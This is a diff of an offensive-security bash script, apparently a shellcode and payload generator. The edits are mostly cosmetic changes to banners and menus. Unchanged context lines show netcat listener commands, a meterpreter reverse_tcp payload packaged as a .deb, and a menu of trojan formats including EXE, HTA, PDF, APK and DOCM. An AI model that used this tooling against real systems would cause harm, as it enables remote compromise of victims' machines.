@@ -141,28 +141,27 @@ clear
 # ------------------------------------
 cat << !
 
-            __    _ ______  ____   _  _____  ____    __  
-           \  \  //|   ___||    \ | |/     \|    \  /  |
-            \  \// |   ___||     \| ||     ||     \/   |
-             \__/  |______||__/\____|\_____/|__/\__/|__|
-               |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
-                      - CodeName: $C0d3 -
-
+               __    _ ______  ____   _  _____  ____    __  
+              \  \  //|   ___||    \ | |/     \|    \  /  |
+               \  \// |   ___||     \| ||     ||     \/   |
+                \__/  |______||__/\____|\_____/|__/\__/|__|
+                  |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
+                         - CodeName: $C0d3 -
 !
-echo "---"
-echo "-- The author does not hold any responsibility for the bad use"
-echo "-- of this tool, remember that attacking targets without prior"
-echo "-- consent is illegal and punished by law."
-echo "--"
-echo "-- The main goal of this tool its not to build 'FUD' payloads!..."
-echo "-- But to give to its users the first glance of how shellcode is"
-echo "-- build, embedded into one template (any language), obfuscated"
-echo "-- (e.g pyherion.py) and compiled into one executable file."
-echo "-- 'reproducing technics found in Veil,Unicorn,powersploit'" 
-echo "--"
-echo "-- Author:r00t-3xp10it | Suspicious Shell Activity (Red Team)"
-echo "-- VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
-echo "---"
+echo "    ╔────────────────────────────────────────────────────────────────╗"
+echo "    |  The author does not hold any responsibility for the bad use   |"
+echo "    |  of this tool, remember that attacking targets without prior   |"
+echo "    |  consent is illegal and punished by law.                       |"
+echo "    |                                                                |"
+echo "    |  The main goal of this tool its not to build 'FUD' payloads!   |"
+echo "    |  But to give to its users the first glance of how shellcode is |"
+echo "    |  build, embedded into one template (any language), obfuscated  |"
+echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
+echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
+echo "    ╠────────────────────────────────────────────────────────────────╝"
+echo "    | Author:r00t-3xp10it | Suspicious Shell Activity (RedTeam)"
+echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
+echo "" && echo ""
 sleep 2
 echo "[☠] Press [ENTER] to continue ..."
 read op
@@ -4183,7 +4182,7 @@ cat << !
 +-------------------------------
 | SRVPORT : 8080
 | SRVHOST : $srvhost
-| FORMAT  : SH,PYTHON -> UNIX's
+| FORMAT  : SH,PYTHON -> unix(s)
 | PAYLOAD : python/meterpreter/reverse_tcp
 |_STORED  : $IPATH/output/$N4m.deb
 
@@ -4700,10 +4699,12 @@ cd $IPATH/
 sh_buildin () {
 # module description
 cat << !
----
--- This module uses system built-in tools sutch as bash, netcat, ssh,
--- etc, and use them to spaw a tcp connection (reverse or bind shell).
----
+
+    ╔──────────────────────────────────────────────────────────────╗
+    | This module uses system built-in tools sutch as bash, netcat |
+    | ssh, python, etc, and use them to spaw a tcp connection      |
+    ╚──────────────────────────────────────────────────────────────╝
+
 !
 sleep 2
 QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "RUN BUILT-IN SHELL GENERATOR?" --width 350) > /dev/null 2>&1
@@ -4744,7 +4745,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v -p $lport"
      sleep 2
 
 
@@ -4760,7 +4761,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
  
 
@@ -4776,7 +4777,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4792,7 +4793,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v 127.0.0.1 -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
      sleep 2
 
 
@@ -4819,7 +4820,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4848,7 +4849,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4876,7 +4877,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4891,7 +4892,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4906,7 +4907,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4921,7 +4922,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4990,37 +4991,37 @@ cat << !
          \  \  //|   ___||    \ | |/     \|    \  /  |
           \  \// |   ___||     \| ||     ||     \/   |
            \__/  |______||__/\____|\_____/|__/\__/|__|$ver
-    +-----------------+-----------+------------+------------------+
+    ╔─────────────────╦───────────╦────────────╦──────────────────╗
     |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
-    +-----------------+-----------+------------+------------------+
-    |  1 - shellcode     unix's       C             C             |
-    |  2 - shellcode     windows      C             DLL           |
-    |  3 - shellcode     windows      DLL           DLL           |
-    |  4 - shellcode     windows      C             PYTHON,EXE    |
-    |  5 - shellcode     windows      C             EXE           |
-    |  6   shellcode     windows      PSH-CMD       EXE           |
-    |  7 - shellcode     windows      C             RUBY          |
-    |  8 - shellcode     windows      MSI-NOUAC     MSI           |
-    |  9 - shellcode     windows      POWERSHELL    BAT           |
-    | 10 - shellcode     windows      HTA-PSH       HTA           |
-    | 11 - shellcode     windows      PSH-CMD       PS1           |
-    | 12 - shellcode     windows      PSH-CMD       BAT           |
-    | 13 - shellcode     windows      VBS           VBS           |
-    | 14 - shellcode     windows      PSH-CMD       VBS           |
-    | 15 - shellcode     windows      PSH-CMD,C     PDF           |
-    | 16 - shellcode     webserver    PHP           PHP,PHP       |
-    | 17 - shellcode     multi OS     PYTHON        PYTHON        |
-    | 18 - shellcode     multi OS     JAVA,PSH      JAR(RCE)      |
-    | 19 - web_delivery  multi OS     PYTHON,PSH    PYTHON,BAT    |
-    | 20 - web_delivery  unix's       SH,PYTHON     DEB           |
-    | 21 - shellcode     android      DALVIK        APK           |
-    | 22 - shellcode     windows      EXE-SERVICE   EXE           |
-    | 23 - shellcode     windows      C             DOCM(word)    |
+    ╠─────────────────╩───────────╩────────────╩──────────────────╣
+    |  1 - shellcode     unix(s)      C              C            |
+    |  2 - shellcode     windows      C              DLL          |
+    |  3 - shellcode     windows      DLL            DLL          |
+    |  4 - shellcode     windows      C              PYTHON,EXE   |
+    |  5 - shellcode     windows      C              EXE          |
+    |  6   shellcode     windows      PSH-CMD        EXE          |
+    |  7 - shellcode     windows      C              RUBY         |
+    |  8 - shellcode     windows      MSI-NOUAC      MSI          |
+    |  9 - shellcode     windows      POWERSHELL     BAT          |
+    | 10 - shellcode     windows      HTA-PSH        HTA          |
+    | 11 - shellcode     windows      PSH-CMD        PS1          |
+    | 12 - shellcode     windows      PSH-CMD        BAT          |
+    | 13 - shellcode     windows      VBS            VBS          |
+    | 14 - shellcode     windows      PSH-CMD        VBS          |
+    | 15 - shellcode     windows      PSH-CMD,C      PDF          |
+    | 16 - shellcode     webserver    PHP            PHP,PHP      |
+    | 17 - shellcode     multi OS     PYTHON         PYTHON       |
+    | 18 - shellcode     multi OS     JAVA,PSH       JAR(RCE)     |
+    | 19 - web_delivery  multi OS     PYTHON,PSH     PYTHON,BAT   |
+    | 20 - web_delivery  unix(s)      SH,PYTHON      DEB          |
+    | 21 - shellcode     android      DALVIK         APK          |
+    | 22 - shellcode     windows      EXE-SERVICE    EXE          |
+    | 23 - shellcode     windows      C              DOCM(word)   |
     |                                                             |
     |  S - system built-in shells                                 |
     |  F - FAQ (frequent ask questions)                           |
     |  E - exit Shellcode Generator                               |
-    +-------------------------------------------------------------+
+    ╚─────────────────────────────────────────────────────────────╣
                                                  SSA-RedTeam@2017_|
 
 !
